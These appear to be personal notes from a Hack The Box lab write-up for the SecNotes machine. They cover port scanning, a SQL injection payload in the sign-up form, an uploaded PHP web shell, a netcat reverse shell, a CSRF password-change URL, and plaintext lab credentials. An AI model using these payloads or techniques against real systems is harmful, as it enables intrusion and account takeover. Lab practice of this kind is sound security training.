# Enumeration 
## Nmap
80/tcp  open  http         syn-ack Microsoft IIS httpd 10.0                                                                                                  
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB) 
### full port scan
8808/tcp open  http    Microsoft IIS httpd 10.0


## Port 445

No anonymous login allowed



# Foothold 




# Privesc 
## port 80
trying sql injection ddin't work
![[Pasted image 20230110182434.png]]

^secnotestyler

there is a sign up link 
trying to inject sign up using sql injection and looks like it worked and account was made ^5b040c

Username: `' Or 1=1-- -`
	Password: ' Or 1=1-- -

![[Pasted image 20230110182620.png]]
and looks like we have notes for all users inside the Secure Notes



![[Pasted image 20230110182723.png]]
from the syntax 
^secnotessmb

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

## port 8808
Trying psexec but not working so accessing the share
and looks like it's default IIS server and looks like it's the one at port 8808 and it's running php from the .png and htm files and we can upload files to the website so let's upload simple php web shell
![[Pasted image 20230110194126.png]]

![[Pasted image 20230110194042.png]]
![[Pasted image 20230110194136.png]]
and we have control of the website 
uploading rev shell and executing it using nc 
start listener 
```
nc -lvnp 9001
```
upload nc.exe to the server 
![[Pasted image 20230110195226.png]]

![[Pasted image 20230110195238.png]] 
![[Pasted image 20230110195348.png]]
and we have a shell

# Privesc

inside user directory we found 

![[Pasted image 20230110205304.png]]

![[Pasted image 20230110205357.png]]

looks like bash is running on the system running where command to find the .exe file

```
where /R c:\windows bash
```
![[Pasted image 20230110210155.png]]
![[Pasted image 20230110210207.png]]
inside .bash_history
![[Pasted image 20230110210334.png]]

^secnotesadmin

found administrator creds
running psexec
![[Pasted image 20230110210515.png]] 

# Alternative ways to user

Sign up to the secnotes.htb and login

![[Pasted image 20230110211239.png]]
![[Pasted image 20230110211300.png]]
sending this request through burp 
![[Pasted image 20230110211330.png]]
there is no CSRF header and user doesn't need to confirm their old passsword
creating CSRF attack by changing POST method to GET and send it to tyler user
![[Pasted image 20230110211542.png]]
We can contact tyler by sending him message from Contact Us
![[Pasted image 20230110211718.png]]
Testing if we get call back 
![[Pasted image 20230110211855.png]]
![[Pasted image 20230110211906.png]]
CSRF url
```
http://secnotes.htb/change_pass.php?password=superxdd&confirm_password=superxdd&submit=submit 
```
![[Pasted image 20230110212037.png]]


# Loot

tyler account:
	tyler@secnotes.htb 

SecNotes [creds](SecNotes#^secnotestyler):
	Username: `' Or 1=1-- -`
	Password: ' Or 1=1-- -

SMB tyler [creds](SecNotes#^secnotessmb):
	Username: tyler 
	Password: 92g!mA8BGjOirkL%OG*&

SMB administrator  [creds:](SecNotes#^secnotesadmin):
	Username: administrator
	Password: u6!4ZwgwOM#^OBf#Nwnh

---
Tags: #HTB #ctf #smb 
Resources: [SecNotes](https://app.hackthebox.com/machines/SecNotes)